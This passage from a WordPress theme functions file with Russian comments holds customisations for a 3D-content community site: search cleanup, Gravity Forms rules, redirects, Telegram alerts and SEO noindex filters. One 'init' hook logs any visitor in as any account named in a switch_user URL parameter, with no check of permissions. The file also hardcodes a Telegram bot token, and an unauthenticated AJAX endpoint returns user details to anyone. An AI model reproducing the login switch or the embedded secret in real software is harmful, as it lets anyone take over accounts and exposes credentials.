                        container.insertBefore(msgDiv, container.firstChild);
                    } else {
                        container.appendChild(msgDiv);
                    }
                    
                    // Прокручиваем экран к сообщению
                    msgDiv.scrollIntoView({behavior: "smooth", block: "center"});
                }
            });
        </script>
        <?php
    }
}
add_action( 'wp_footer', 'woffice_display_banned_message_js' );


 

 /**
 * v16.1 Умный редирект: очистка невидимых символов + нормализация спецсимволов (&, -, :)Это делает поиск "человечным" и предотвращает вылеты на главную.
 * https://aistudio.google.com/app/prompts?state=%7B%22ids%22:%5B%221TUXgjzYxErL3V8trfEnVARSzK02xL7yB%22%5D,%22action%22:%22open%22,%22userId%22:%22106426325981430699849%22,%22resourceKeys%22:%7B%7D%7D&usp=sharing
 */
if ( ! defined( 'ABSPATH' ) ) exit;

class My_Search_Redirect_Fixer {

    public function __construct() {
        add_action( 'init', array( $this, 'force_clean_and_redirect' ), 1 );
    }

    public function force_clean_and_redirect() {
        if ( is_admin() || ! isset( $_GET['s'] ) ) return;

        $raw_s = $_GET['s'];
        
        // 1. Очистка невидимых "призраков"
        $invisible_chars = [
            "\xE2\x80\x8B", "\xE2\x80\x8C", "\xE2\x80\x8D", "\xEF\xBB\xBF"
        ];
        $temp_s = str_replace( $invisible_chars, '', $raw_s );

        // 2. Превращаем проблемные символы в пробелы
        // Добавляем '&', чтобы запрос "G9 & G8.1" превратился в "G9 G8.1"
        $chars_to_space = ['&', '’', '´', "'", '"', '`', '“', '”', '‘', '’', ',', '–', '—', ':', '/'];
        $temp_s = str_replace( $chars_to_space, ' ', $temp_s );

        // 3. Убираем лишние двойные пробелы, которые могли появиться
        $clean_s = preg_replace( '/\s+/', ' ', trim( $temp_s ) );

        // Если после всех манипуляций строка изменилась — редиректим на чистый URL
        if ( $clean_s !== $raw_s ) {
            $new_url = add_query_arg( 's', urlencode( $clean_s ), home_url( '/' ) );
            
            // Логирование можно оставить для проверки, потом удалите
            // $this->log_fix("Search Fixed: From [" . $raw_s . "] to [" . $clean_s . "]");

            wp_redirect( $new_url );
            exit;
        }
    }

    private function log_fix( $msg ) {
        $log_file = ABSPATH . 'log_search.txt';
        $time = date('Y-m-d H:i:s');
        file_put_contents($log_file, "[$time] $msg" . PHP_EOL, FILE_APPEND);
    }
}

new My_Search_Redirect_Fixer();


/**
 * Ограничение отправки Gravity Forms для гостей (с поддержкой многостраничности)
 */
// 1. Добавляем класс гостя в body
add_filter('body_class', function($classes) {
    if (!is_user_logged_in()) {
        $classes[] = 'gf-guest-user';
    }
    return $classes;
});

// 2. Стили: скрываем ТОЛЬКО кнопку Submit, оставляем кнопки Next/Previous
add_action('wp_head', function() {
    if (is_user_logged_in()) return;
    ?>
    <style>
        /* 1. Скрываем финальную кнопку отправки */
        .gf-guest-user .gform_footer input[type="submit"],
        .gf-guest-user .gform_page_footer input[type="submit"],
        .gf-guest-user .gform_footer button[id*="gform_submit_button"],
        .gf-guest-user .gform_page_footer button[id*="gform_submit_button"] {
            display: none !important;
        }

        /* 2. Настраиваем контейнер футера, чтобы элементы могли переноситься */
        .gf-guest-user .gform_page_footer,
        .gf-guest-user .gform_footer {
            display: flex !important;
            flex-wrap: wrap !important; /* Позволяет уведомлению упасть на новую строку */
            justify-content: center;
        }

        /* 3. Делаем уведомление на всю ширину */
        .gf-guest-user .gform_page_footer:not(:has(.gform_next_button))::after,
        .gf-guest-user .gform_footer::after {
            content: "Please log in to submit.";
            display: block !important;
            width: 100% !important;   /* Растягиваем на всю ширину */
            flex-basis: 100% !important; /* Гарантия для flex-контейнеров */
            order: 10;                /* Ставим в самый конец, после всех кнопок */
            
            box-sizing: border-box;
            padding: 15px;
            margin-top: 15px;
            background-color: #fff3cd;
            color: #856404;
            border: 1px solid #ffeeba;
            border-radius: 4px;
            text-align: center;
            font-weight: 600;
        }
        
        /* Если нужно, чтобы кнопка Previous на последней странице тоже была 100% */
        .gf-guest-user .gform_page_footer:not(:has(.gform_next_button)) .gform_previous_button {
            width: 100% !important;
            margin-bottom: 10px;
        }
    </style>
    <?php
});

// 3. Исправленная серверная проверка
add_filter('gform_validation', function($validation_result) {
    // Если пользователь авторизован — ничего не делаем
    if (is_user_logged_in()) {
        return $validation_result;
    }

    $form = $validation_result['form'];
    
    // Определяем, куда направляется пользователь.
    // В Gravity Forms: 0 - это попытка финальной отправки. 
    // Число > 0 - это переход на конкретную страницу (Next/Previous).
    $target_page = rgpost( "gform_target_page_number_{$form['id']}" );

    if ($target_page == 0) {
        // Блокируем только финальную отправку
        $validation_result['is_valid'] = false;

        // Выводим общую ошибку формы (над полями)
        add_filter('gform_validation_message', function($message, $form) {
            return '<div class="validation_error">Submission is disabled for guests. Please log in.</div>';
        }, 10, 2);
    }

    return $validation_result;
});


// уведомление в виджете при заполнении формы GravityForms
add_shortcode('gf_admin_widget', 'custom_gf_entries_frontend_widget');

function custom_gf_entries_frontend_widget($atts) {
    // 1. ПРОВЕРКА ПРАВ: Если пользователь НЕ администратор, ничего не выводим
    if (!current_user_can('manage_options')) {
        return '';
    }

    // 2. Настройки по умолчанию (можно менять в шорткоде)
    $atts = shortcode_atts(array(
        'id' => 38, // ID вашей формы по умолчанию
        'count' => 5 // Количество заявок для вывода
    ), $atts);

    $form_id = intval($atts['id']);
    $count = intval($atts['count']);

    // Проверка, активен ли плагин Gravity Forms
    if (!class_exists('GFAPI')) {
        return '<p>Gravity Forms не активирован.</p>';
    }

    // 3. Получаем заявки из базы данных
    $paging = array('offset' => 0, 'page_size' => $count);
    $sorting = array('key' => 'date_created', 'direction' => 'DESC');
    $entries = GFAPI::get_entries($form_id, array(), $sorting, $paging);

    // 4. Формируем внешний вид виджета
    $output = '<div class="gf-frontend-widget" style="background:none; padding:0px; border:0px solid #ddd; border-radius:8px; font-family:sans-serif; max-width: 400px;">';
    $output .= '<h3 style="margin-top:0;">Последние обмены (#'.$form_id.')</h3>';

    if (is_wp_error($entries) || empty($entries)) {
        $output .= '<p>Пока нет новых заявок.</p>';
    } else {
        $output .= '<ul style="list-style:none; padding:0; margin:0;">';
        
        foreach ($entries as $entry) {
            // Форматируем дату
            $date = date('d.m.Y в H:i', strtotime($entry['date_created']) + (get_option('gmt_offset') * 3600));
            // Ссылка на конкретную заявку в админке
            $entry_url = admin_url('admin.php?page=gf_entries&view=entry&id=' . $form_id . '&lid=' . $entry['id']);
            
            $output .= '<li style="margin-bottom:12px; border-bottom:1px solid #eaeaea; padding-bottom:8px;">';
            $output .= '<span style="display:block; font-size:12px; color:#666;">' . $date . '</span>';
            $output .= '<strong>Заявка #' . $entry['id'] . '</strong> <br>';
            $output .= '<a href="' . $entry_url . '" target="_blank" style="font-size:13px; color:#0073aa; text-decoration:none;">Открыть в админке →</a>';
            $output .= '</li>';
        }
        $output .= '</ul>';
    }

    $output .= '<a href="' . admin_url('admin.php?page=gf_entries&id=' . $form_id) . '" style="display:inline-block; margin-top:10px; padding:8px 15px; background:#0073aa; color:#fff; text-decoration:none; border-radius:4px; font-size:14px;">Все заявки</a>';
    $output .= '</div>';

    return $output;
}

//редирект с запросов в бандл или каталог
add_action( 'template_redirect', 'redirect_old_cpt_to_new_destination' );

function redirect_old_cpt_to_new_destination() {
    // 1. Проверяем, является ли страница ошибкой 404
    if ( is_404() ) {
        $request_uri = $_SERVER['REQUEST_URI'];
        
        // 2. Ищем совпадение: URL должен начинаться с /request/ или /bundle/
        // $matches[1] сохранит тип (request или bundle), а $matches[2] сохранит ярлык (slug)
        if ( preg_match( '#/(request|bundle)/([^/?]+)#i', $request_uri, $matches ) ) {
            
            $old_type = strtolower( $matches[1] );
            $slug     = sanitize_title( $matches[2] );
            
            $target_post_id = 0;

            // 3. Логика для старых адресов /request/...
            if ( $old_type === 'request' ) {
                
                // Сначала проверяем, не стал ли он бандлом
                $bundle_posts = get_posts( array(
                    'name'           => $slug,
                    'post_type'      => 'bundle',
                    'post_status'    => 'publish',
                    'posts_per_page' => 1
                ) );
                
                if ( ! empty( $bundle_posts ) ) {
                    $target_post_id = $bundle_posts[0]->ID;
                } else {
                    // Если бандла нет, проверяем, не стал ли он уже обычным постом
                    $standard_posts = get_posts( array(
                        'name'           => $slug,
                        'post_type'      => 'post',
                        'post_status'    => 'publish',
                        'posts_per_page' => 1
                    ) );
                    
                    if ( ! empty( $standard_posts ) ) {
                        $target_post_id = $standard_posts[0]->ID;
                    }
                }
            } 
            // 4. Логика для старых адресов /bundle/... (когда прошел год)
            elseif ( $old_type === 'bundle' ) {
                
                // Проверяем, перемещен ли он в обычные посты
                $standard_posts = get_posts( array(
                    'name'           => $slug,
                    'post_type'      => 'post',
                    'post_status'    => 'publish',
                    'posts_per_page' => 1
                ) );
                
                if ( ! empty( $standard_posts ) ) {
                    $target_post_id = $standard_posts[0]->ID;
                }
            }

            // 5. Если мы нашли актуальную страницу, делаем 301 редирект
            if ( $target_post_id ) {
                $new_url = get_permalink( $target_post_id );
                wp_safe_redirect( $new_url, 301 );
                exit;
            }
        }
    }
}

function my_links_list_script() {
    ?>
    <script>
    document.addEventListener('DOMContentLoaded', function() {
 
        const clearButtons = document.querySelectorAll('.clear-button');
        clearButtons.forEach(function(btn) {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                const allItems = document.querySelectorAll('.list-item');
                allItems.forEach(function(item) {
                    item.classList.remove('is-copied');
                });
                const keysToRemove = [];
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    if (key && key.indexOf('copied_') === 0) {
                        keysToRemove.push(key);
                    }
                }
                keysToRemove.forEach(function(key) {
                    sessionStorage.removeItem(key);
                });
            });
        });
 
        const copyElements = document.querySelectorAll('.copy-title');
        copyElements.forEach(function(element) {
            const textToCopy = element.innerText;
            const parentDiv = element.closest('.list-item');
 
            const checkMark = document.createElement('span');
            checkMark.innerHTML = '&#10004;';
            checkMark.className = 'status-check';
            checkMark.title = 'Click to remove mark';
            parentDiv.appendChild(checkMark);
 
            if (sessionStorage.getItem('copied_' + textToCopy)) {
                parentDiv.classList.add('is-copied');
            }
 
            checkMark.addEventListener('click', function(e) {
                e.stopPropagation();
                parentDiv.classList.remove('is-copied');
                sessionStorage.removeItem('copied_' + textToCopy);
            });
 
            element.addEventListener('click', function() {
                if (!navigator.clipboard) {
                    alert('Clipboard API недоступен. Убедитесь, что сайт работает по HTTPS.');
                    return;
                }
                navigator.clipboard.writeText(textToCopy).then(function() {
                    const notification = parentDiv.querySelector('.copy-notification');
                    parentDiv.classList.add('is-copied');
                    sessionStorage.setItem('copied_' + textToCopy, 'true');
                    if (notification) {
                        notification.style.opacity = '1';
                        setTimeout(function() {
                            notification.style.opacity = '0';
                        }, 2000);
                    }
                }).catch(function(err) {
                    console.error('Failed to copy text: ', err);
                });
            });
        });
    });
    </script>
    <?php
}
add_action('wp_footer', 'my_links_list_script');

// установка алмаза в премиум форму
function my_set_default_tag_on_submission( $entry, $form ) {
    
    // --- НАСТРОЙКИ ---
    
    // 1. Укажите ID формы, которую нужно обработать.
    // Вы можете найти его в настройках формы Gravity Forms.
    $target_form_id = 59; // <--- Замените 1 на реальный ID вашей формы
    
    // 2. Укажите название тега, который должен устанавливаться (slug).
    $tag_name = 'starry'; // <--- Замените на нужный вам тег (например, 'featured', 'community-post')

    // -----------------
    
    // Проверка: работаем только с целевой формой
    if ( $form['id'] != $target_form_id ) {
        return;
    }
    
    // Получаем ID записи (поста), созданного формой
    $post_id = rgar( $entry, 'post_id' );

    // Проверка: запись должна быть успешно создана
    if ( $post_id && get_post_type( $post_id ) ) {
        
        // Получаем объект тега по его названию (slug)
        $tag = get_term_by( 'slug', $tag_name, 'post_tag' );
        
        // Если тег существует, добавляем его к посту
        if ( $tag && ! is_wp_error( $tag ) ) {
            
            // Получаем текущий список тегов для поста
            $current_tags = wp_get_post_terms( $post_id, 'post_tag', array( 'fields' => 'ids' ) );
            
            // Проверяем, не установлен ли уже этот тег
            if ( ! in_array( $tag->term_id, $current_tags ) ) {
                $current_tags[] = $tag->term_id; // Добавляем новый тег к списку
            }
            
            // Устанавливаем обновленный список тегов для поста
            wp_set_post_terms( $post_id, $current_tags, 'post_tag', false );
            
            // Необязательно: логирование для отладки
            // error_log( "Тег '{$tag_name}' добавлен к посту ID: {$post_id}" );
        } else {
            // Если тег не существует, создаем его и добавляем к посту
            wp_insert_term( 
                $tag_name, 
                'post_tag', 
                array( 'slug' => $tag_name ) 
            );
            // Повторно устанавливаем тег (на этот раз созданный)
            wp_set_post_terms( $post_id, $tag_name, 'post_tag', true ); 
        }
    }
}
add_action( 'gform_after_submission', 'my_set_default_tag_on_submission', 10, 2 );


// Telegram-уведомление при обмене сертификата


add_action( 'gform_after_submission_38', 'send_telegram_on_gf_submit', 10, 2 );

function send_telegram_on_gf_submit( $entry, $form ) {

    // ─── Настройки ───────────────────────────────────────────────────────────
    $bot_token = '8709537505:AAFwmln_55sXyk3MiYids-8sLv3S2f0hFXg';
    $chat_id   = '839626089';
    // ─────────────────────────────────────────────────────────────────────────

    $form_title = esc_html( $form['title'] );
    $date       = date_i18n( 'd.m.Y H:i', strtotime( $entry['date_created'] ) );

    // Значение Hidden Field (Field ID: 38) — username пользователя
    $hidden_value = rgar( $entry, '38' );
    $username     = strtolower( trim( $hidden_value ) );

    // Ссылки
    $search_url   = 'http://3d-stuff.community/wp-admin/users.php?ac-actions-form=1&orderby=mycred_default&order=desc&s=' . urlencode( $username );
    $activity_url = 'http://3d-stuff.community/activity/';

    // Тексты для ответа пользователю
    $text_success = '@' . $username . ' Thanks for your exchange! The diamonds have been added to your balance.';
    $text_wrong   = '@' . $username . ' Wrong or expired Gift Card Code.' . "\n" . 'Please check the gift card code\'s status and balance before submitting it.';
    $message  = "🗂 *Форма:* " . $form_title . "\n";
    $message .= "🕐 *Дата:* " . $date . "\n";

    // Поля формы
    foreach ( $form['fields'] as $field ) {
        if ( in_array( $field->type, [ 'html', 'section', 'page', 'captcha' ], true ) ) {
            continue;
        }

        $label = esc_html( $field->label );
        $value = RGFormsModel::get_lead_field_value( $entry, $field );
        $value = GFCommon::get_lead_field_display( $field, $value, $entry['currency'], false, 'text' );
        $value = wp_strip_all_tags( $value );

        if ( ! empty( trim( $value ) ) ) {
            $message .= "▸ *" . $label . ":* " . $value . "\n";
        }
    }

	// Ссылки
    $message .= "\n👤 [Открыть пользователя](" . $search_url . ")";
    $message .= "\n✉️ [Написать пользователю](" . $activity_url . ")";

    // Тексты для копирования
    $message .= "\n\n✅ *Успешный обмен:*";
    $message .= "\n`" . $text_success . "`";
    $message .= "\n\n❌ *Неверный код:*";
    $message .= "\n`" . $text_wrong . "`";
    $api_url = "https://api.telegram.org/bot{$bot_token}/sendMessage";

    $response = wp_remote_post( $api_url, [
        'timeout' => 15,
        'body'    => [
            'chat_id'                  => $chat_id,
            'text'                     => $message,
            'parse_mode'               => 'Markdown',
            'disable_web_page_preview' => true,
        ],
    ] );

    if ( is_wp_error( $response ) ) {
        error_log( '[GF Telegram] Ошибка отправки: ' . $response->get_error_message() );
    } else {
        $body = json_decode( wp_remote_retrieve_body( $response ), true );
        if ( empty( $body['ok'] ) ) {
            error_log( '[GF Telegram] API ответил ошибкой: ' . print_r( $body, true ) );
        }
    }
}

/**
 * Включаем работу закладок (CBX WP Bookmark) для кастомных типов записей mature и bundle
 */
add_filter( 'cbxwpbookmark_allowed_object_types_helper', function( $allowed_types ) {
    if ( ! is_array( $allowed_types ) ) {
        $allowed_types = array();
    }
    $allowed_types[] = 'mature';
    $allowed_types[] = 'bundle';
    return array_unique( $allowed_types );
});

/**
 * Авто-логин для переключения аккаунтов из юзерскрипта
 */
add_action('init', function() {
    if (isset($_GET['switch_user'])) {
        $username = sanitize_text_field($_GET['switch_user']);
        $user = get_user_by('login', $username);
        
        if ($user) {
            $current_user_id = get_current_user_id();
            if ($current_user_id !== $user->ID) {
                wp_clear_auth_cookie();
                wp_set_current_user($user->ID);
                wp_set_auth_cookie($user->ID, true);
            }
            
            // Сохраняем все GET параметры кроме switch_user и безопасно редиректим
            $redirect_url = remove_query_arg('switch_user');
            wp_safe_redirect($redirect_url);
            exit;
        }
    }
});

/**
 * AJAX эндпоинт для динамического получения аватарок и имен пользователей
 */
function ajax_get_user_avatar_info() {
    $usernames = isset($_GET['users']) ? explode(',', $_GET['users']) : ['andy', 'mila', 'Amsha'];
    $response = [];
    
    foreach ($usernames as $username) {
        $username = trim($username);
        $user = get_user_by('login', $username);
        if ($user) {
            $avatar_url = '';
            if (function_exists('bp_core_fetch_avatar')) {
                $avatar_url = bp_core_fetch_avatar([
                    'item_id' => $user->ID,
                    'type'    => 'thumb',
                    'html'    => false
                ]);
            }
            if (empty($avatar_url)) {
                $avatar_url = get_avatar_url($user->ID);
            }
            
            $response[] = [
                'id' => $user->ID,
                'username' => $user->user_login,
                'displayName' => $user->display_name,
                'avatar' => $avatar_url
            ];
        }
    }
    
    wp_send_json_success($response);
}
add_action('wp_ajax_get_user_avatar_info', 'ajax_get_user_avatar_info');
add_action('wp_ajax_nopriv_get_user_avatar_info', 'ajax_get_user_avatar_info');

/**
 * =========================================================================
 * НАВИГАЦИЯ И ФИЛЬТРАЦИЯ ДЛЯ РАЗДЕЛА MATURE (ДЛЯ ВЗРОСЛЫХ)
 * Сохраняет контекст раздела mature при переходе по авторам, категориям и тегам.
 * =========================================================================
 */

/**
 * 1. Фильтрация основного запроса на архивных страницах при наличии параметра post_type=mature в URL.
 */
function custom_archive_post_type_filter( $query ) {
    if ( ! is_admin() && $query->is_main_query() ) {
        // Проверяем, что это страница архива (рубрика, метка, таксономия или автор)
        if ( $query->is_category() || $query->is_tag() || $query->is_tax() || $query->is_author() ) {
            if ( isset( $_GET['post_type'] ) ) {
                $post_type = sanitize_key( $_GET['post_type'] );
                // Разрешаем только безопасные кастомные типы записей (включая mature)
                if ( in_array( $post_type, array( 'post', 'mature', 'bundle' ) ) ) {
                    $query->set( 'post_type', $post_type );
                }
            }
        }
    }
}
add_action( 'pre_get_posts', 'custom_archive_post_type_filter' );

/**
 * 2. Динамическое добавление параметра ?post_type=mature к ссылкам автора, категорий и тегов.
 */
function add_post_type_to_archive_links( $link ) {
    if ( is_admin() ) {
        return $link;
    }

    $current_type = 'post';
    if ( is_singular() ) {
        $current_type = get_post_type();
    } elseif ( isset( $_GET['post_type'] ) ) {
        $current_type = sanitize_key( $_GET['post_type'] );
    }

    // Добавляем параметр в URL только для раздела 'mature' (и 'bundle')
    if ( in_array( $current_type, array( 'mature', 'bundle' ) ) ) {
        $link = add_query_arg( 'post_type', $current_type, $link );
    }

    return $link;
}
add_filter( 'author_link', 'add_post_type_to_archive_links', 10, 1 );
add_filter( 'term_link', 'add_post_type_to_archive_links', 10, 1 );

/**
 * 3. Удаление параметра post_type из ссылок меню навигации.
 * Предотвращает наследование фильтра post_type=mature в главном и других меню сайта,
 * но сохраняет его для внутриконтентных ссылок (тегов, рубрик, авторов).
 */
function remove_post_type_from_menu_items( $items ) {
    if ( is_array( $items ) ) {
        foreach ( $items as $item ) {
            if ( isset( $item->type ) && $item->type !== 'custom' && isset( $item->url ) ) {
                $item->url = remove_query_arg( 'post_type', $item->url );
            }
        }
    }
    return $items;
}
add_filter( 'wp_get_nav_menu_items', 'remove_post_type_from_menu_items', 99, 1 );

/**
 * Ограничение работы Gravity Forms Styles Pro только для форм 43 и 50.
 * Для всех остальных форм плагин отключает свои стили (возвращает тему 'none').
 */
add_filter( 'gf_stylespro_theme_filter', function( $theme, $form ) {
    $allowed_forms = array( 43, 50 );

    if ( isset( $form['id'] ) && ! in_array( (int) $form['id'], $allowed_forms, true ) ) {
        return 'none';
    }

    return $theme;
}, 10, 2 );


// --- НАЧАЛО: Отключение принудительных <br /> для Gravity Forms ---
// 1. Убираем авто-добавление <br /> из полей Gravity Forms перед созданием поста
add_filter( 'gform_post_data', 'gf_remove_automatic_br_from_post_content', 99, 3 );
function gf_remove_automatic_br_from_post_content( $post_data, $form, $entry ) {
    if ( isset( $post_data['post_content'] ) ) {
        $post_data['post_content'] = preg_replace( '/<br\s*\/?>\s*\r?\n?/i', "\n", $post_data['post_content'] );
    }
    return $post_data;
}

// 2. Для контентных шаблонов убираем <br /> перед записью в БД для типов записей 'request' и 'post'
add_filter( 'wp_insert_post_data', 'custom_clean_request_post_content', 99, 2 );
function custom_clean_request_post_content( $data, $postarr ) {
    if ( isset( $data['post_type'] ) && ( $data['post_type'] === 'request' || $data['post_type'] === 'post' ) && isset( $data['post_content'] ) ) {
        $data['post_content'] = preg_replace( '/<br\s*\/?>\s*\r?\n?/i', "\n", $data['post_content'] );
    }
    return $data;
}
// --- КОНЕЦ: Отключение принудительных <br /> ---

/**
 * Вспомогательная функция: возвращает Timestamp даты-рубикона.
 * Вычисляется один раз за сессию благодаря static.
 * https://gemini.google.com/app/d46091cb44e64a86?utm_source=app_launcher&utm_medium=owned&utm_campaign=base_all
 */
function get_ai_cutoff_timestamp() {
    static $cutoff_ts = null;

    if ( $cutoff_ts === null ) {
        // Укажите здесь вашу единую дату отсечения
        $cutoff_ts = strtotime( '2020-12-01' );
    }

    return $cutoff_ts;
}

/**
 * 1. Исключаем из XML-карты Yoast
 */
add_filter( 'wpseo_sitemap_entry', 'exclude_old_unprocessed_posts_from_sitemap', 10, 3 );
function exclude_old_unprocessed_posts_from_sitemap( $url, $type, $post ) {

    if ( $type !== 'post' || empty( $post->ID ) ) {
        return $url;
    }

    $is_processed = get_post_meta( $post->ID, '_ai_processed', true );
    $post_date    = $post->post_date;

    if ( empty( $post_date ) ) {
        return $url;
    }

    $cutoff_ts = get_ai_cutoff_timestamp();

    if ( ! $is_processed && strtotime( $post_date ) < $cutoff_ts ) {
        return false;
    }

    return $url;
}

/**
 * 2. Выводим чистый noindex через фильтр Yoast SEO
 */
add_filter( 'wpseo_robots', 'custom_yoast_noindex_for_unprocessed_posts' );
function custom_yoast_noindex_for_unprocessed_posts( $robots ) {

    if ( is_singular( 'post' ) ) {
        global $post;

        // Защита: проверяем, что объект $post действительно существует и имеет ID
        if ( empty( $post->ID ) ) {
            return $robots;
        }

        $is_processed = get_post_meta( $post->ID, '_ai_processed', true );
        $cutoff_ts    = get_ai_cutoff_timestamp();

        if ( ! $is_processed && ! empty( $post->post_date ) && strtotime( $post->post_date ) < $cutoff_ts ) {
            // Подменяем значение Yoast на noindex
            return 'noindex, follow';
        }
    }

    return $robots;
}


